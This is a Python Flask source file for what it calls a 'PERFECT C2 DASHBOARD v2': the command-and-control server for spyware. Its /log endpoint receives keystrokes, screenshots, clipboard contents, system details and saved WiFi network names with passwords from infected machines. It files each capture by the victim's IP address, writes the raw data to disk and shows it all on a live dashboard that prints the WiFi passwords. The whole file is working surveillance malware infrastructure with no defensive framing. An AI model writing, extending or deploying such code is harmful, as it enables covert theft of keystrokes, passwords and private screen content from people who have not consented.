from flask import Flask, request, jsonify, send_from_directory
import os
import json
import time
from datetime import datetime
from collections import deque
import base64

app = Flask(__name__)
DATA_DIR = 'data'
os.makedirs(DATA_DIR, exist_ok=True)

# UNLIMITED STORAGE
live_data = {
    'keystrokes': [],
    'screenshots': [],
    'wifi': [],
    'clipboard': [],
    'system': []
}

# STATE TRACKING FOR DEDUP
last_wifi = {}
last_clipboard = {}

@app.route('/log', methods=['POST'])
def perfect_log():
    try:
        data = request.json
        timestamp = datetime.now().strftime('%H:%M:%S')
        ip = request.remote_addr
        
        entry = {'ts': timestamp, 'ip': ip, 'data': data}
        
        # KEYSTROKES - always add
        if data.get('keystrokes', {}).get('raw'):
            live_data['keystrokes'].append(entry)
        
        # SCREENSHOTS - always add  
        if data.get('screenshots'):
            live_data['screenshots'].append(entry)
        
        # WIFI - only if new data OR different IP
        wifi_data = data.get('wifi_profiles', [])
        if wifi_data:
            wifi_key = f"{ip}_{hash(tuple(sorted([p['ssid'] for p in wifi_data])))}"
            if not last_wifi.get(ip) or last_wifi[ip] != wifi_key:
                live_data['wifi'].append(entry)
                last_wifi[ip] = wifi_key
                print(f"📶 NEW WIFI from {ip}: {len(wifi_data)} profiles")
        
        # CLIPBOARD - only if changed
        clipboard_text = ''.join(data.get('clipboard', []))
        if clipboard_text:
            clip_key = f"{ip}_{hash(clipboard_text)}"
            if not last_clipboard.get(ip) or last_clipboard[ip] != clip_key:
                live_data['clipboard'].append(entry)
                last_clipboard[ip] = clip_key
                print(f"📋 NEW CLIPBOARD from {ip}: {len(clipboard_text)} chars")
        
        # SYSTEM - always
        live_data['system'].append(entry)
        
        # Save raw
        filename = f"{int(time.time()*1000)}_{ip.replace('.','_')}.json"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"📥 [{ip}] K:{len(live_data['keystrokes'])} SS:{len(live_data['screenshots'])} WiFi:{len(live_data['wifi'])} Clip:{len(live_data['clipboard'])}")
        return jsonify({'status': 'PERFECT'}), 200
        
    except Exception as e:
        print(f"❌ {e}")
        return jsonify({'error': str(e)}), 500

# FIXED DELETE + CLEAR
@app.route('/delete/<category>/<index>')
def delete_item(category, index):
    try:
        idx = int(index)
        if category in live_data and idx < len(live_data[category]):
            deleted = live_data[category].pop(idx)
            print(f"🗑️ Deleted {category}[{idx}]")
            return jsonify({'status': 'deleted'})
    except:
        pass
    return jsonify({'error': 'not found'}), 404

@app.route('/clear/<category>')
def clear_category(category):
    if category in live_data:
        count = len(live_data[category])
        live_data[category].clear()
        if category == 'wifi':
            last_wifi.clear()
        elif category == 'clipboard':
            last_clipboard.clear()
        print(f"🗑️ CLEARED {category} ({count} items)")
        return jsonify({'status': 'cleared', 'count': count})
    return jsonify({'error': 'not found'}), 404

@app.route('/', methods=['GET'])
def perfect_dashboard():
    # Build sections
    keystrokes_html = ''.join([
        f'''
        <div class="capture" id="keys-{len(live_data['keystrokes'])-15+i}">
            <span class="ip">{c['ip']}</span> <span class="ts">{c['ts']}</span>
            <div class="keys">{json.dumps(c['data'].get('keystrokes',{}).get('raw','')[-100:], ensure_ascii=False)}</div>
            <small>{c['data'].get('keystrokes',{}).get('count',0)} keys 
            <button onclick="deleteItem('keystrokes', {len(live_data['keystrokes'])-15+i})" style="background:#ff4444;color:white;border:none;padding:4px 8px;border-radius:3px;cursor:pointer;font-size:11px;">🗑️</button></small>
        </div>
        ''' for i, c in enumerate(live_data['keystrokes'][-15:])
    ])
    
    screenshots_html = ''.join([
        f'''
        <div class="capture" id="ss-{len(live_data['screenshots'])-12+i}">
            <span class="ip">{c['ip']}</span> <span class="ts">{c['ts']}</span>
            <img src="data:image/jpeg;base64,{c['data'].get('screenshots', [{}])[0].get('data', '')[:100000]}" class="screenshot">
            <small>{c['data'].get('screenshots', [{}])[0].get('size', 0)//1000}KB 
            <button onclick="deleteItem('screenshots', {len(live_data['screenshots'])-12+i})" style="background:#ff4444;color:white;border:none;padding:4px 8px;border-radius:3px;cursor:pointer;">🗑️</button></small>
        </div>
        ''' for i, c in enumerate(live_data['screenshots'][-12:])
    ])
    
    wifi_html = ''.join([
        f'''
        <div class="capture" id="wifi-{len(live_data['wifi'])-5+i}">
            <span class="ip">{c['ip']}</span> <span class="ts">{c['ts']}</span>
            <div class="wifi-profiles">
                {"".join([f'<div>{p["ssid"]}: <strong>{p["password"]}</strong></div>' for p in c["data"].get("wifi_profiles", [])])}
            </div>
            <button onclick="deleteItem('wifi', {len(live_data['wifi'])-5+i})" style="background:#ff4444;color:white;border:none;padding:4px 8px;border-radius:3px;">🗑️</button>
        </div>
        ''' for i, c in enumerate(live_data['wifi'][-5:])
    ])
    
    clipboard_html = ''.join([
        f'''
        <div class="capture clip-item" id="clip-{len(live_data['clipboard'])-10+i}">
            <span class="ip">{c['ip']}</span> <span class="ts">{c['ts']}</span>
            <div>{json.dumps(c['data'].get('clipboard', [""])[-1], ensure_ascii=False)[:200]}</div>
            <button onclick="deleteItem('clipboard', {len(live_data['clipboard'])-10+i})" style="background:#ff4444;color:white;border:none;padding:4px 8px;border-radius:3px;">🗑️</button>
        </div>
        ''' for i, c in enumerate(live_data['clipboard'][-10:])
    ])
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 PERFECT C2 DASHBOARD v2</title>
    <meta http-equiv="refresh" content="5">
    <script>
        function deleteItem(category, index) {{
            fetch(`/delete/${{category}}/${{index}}`)
                .then(() => location.reload());
        }}
        function clearCategory(category) {{
            fetch(`/clear/${{category}}`)
                .then(() => location.reload());
        }}
    </script>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; font-family:'Consolas',monospace; }}
        body {{ background:#0a0a0a; color:#00ff88; padding:20px; }}
        .header {{ background:linear-gradient(90deg,#1a1a2e,#16213e); padding:25px; border-radius:15px; text-align:center; margin-bottom:25px; }}
        .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:20px; }}
        .stat {{ background:#16213e; padding:20px; border-radius:10px; text-align:center; border-left:4px solid #00ff88; }}
        .stat-num {{ font-size:36px; font-weight:bold; color:#00ff88; }}
        .category {{ background:#1a1a2e; margin:20px 0; padding:25px; border-radius:15px; }}
        .category h2 {{ color:#00ff88; margin-bottom:20px; padding-bottom:10px; display:flex; justify-content:space-between; }}
        .clear-btn {{ background:#ff4444 !important; color:white; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }}
        .capture {{ background:#0f0f23; margin:12px 0; padding:18px; border-radius:10px; border-left:5px solid #00ff88; }}
        .keys {{ background:#0002; padding:12px; border-radius:6px; white-space:pre-wrap; font-size:15px; color:#00ff88; min-height:40px; }}
        .wifi-profiles div {{ padding:8px; background:#111; margin:5px 0; border-radius:5px; border-left:3px solid #ffaa00; }}
        .screenshot {{ max-width:400px; max-height:300px; border-radius:10px; }}
        .ip {{ color:#ff6b6b; font-weight:bold; }}
        .ts {{ color:#888; float:right; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PERFECT C2 v2 - ALL FIXED</h1>
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(live_data['keystrokes'])}</div>⌨️ Keystrokes</div>
            <div class="stat"><div class="stat-num">{len(live_data['screenshots'])}</div>📸 Screenshots</div>
            <div class="stat"><div class="stat-num">{len(live_data['wifi'])}</div>📶 WiFi</div>
            <div class="stat"><div class="stat-num">{len(live_data['clipboard'])}</div>📋 Clipboard</div>
        </div>
    </div>

    <div class="category">
        <h2>⌨️ KEYSTROKES <button class="clear-btn" onclick="clearCategory('keystrokes')">CLEAR ALL</button></h2>
        {keystrokes_html or '<div style="color:#666;text-align:center;padding:40px;">No keystrokes yet...</div>'}
    </div>

    <div class="category">
        <h2>📸 SCREENSHOTS <button class="clear-btn" onclick="clearCategory('screenshots')">CLEAR ALL</button></h2>
        {screenshots_html or '<div style="color:#666;text-align:center;padding:40px;">No screenshots yet...</div>'}
    </div>

    <div class="category">
        <h2>📶 WIFI PROFILES <button class="clear-btn" onclick="clearCategory('wifi')">CLEAR ALL</button></h2>
        {wifi_html or '<div style="color:#666;text-align:center;padding:40px;">No WiFi data yet...</div>'}
    </div>

    <div class="category">
        <h2>📋 CLIPBOARD <button class="clear-btn" onclick="clearCategory('clipboard')">CLEAR ALL</button></h2>
        {clipboard_html or '<div style="color:#666;text-align:center;padding:40px;">No clipboard data yet...</div>'}
    </div>
</body>
</html>
    """
    return html

@app.route('/files')
def list_files():
    files = [f'<a href="/files/{f}">{f}</a><br>' for f in sorted(os.listdir(DATA_DIR))[-30:]]
    return ''.join(files)

@app.route('/files/<filename>')
def serve_file(filename):
    return send_from_directory(DATA_DIR, filename)

if __name__ == '__main__':
    print("🚀 PERFECT C2 v2 - WIFI/CLIPBOARD/CLEAR FIXED!")
    app.run(host='0.0.0.0', port=5000, debug=False)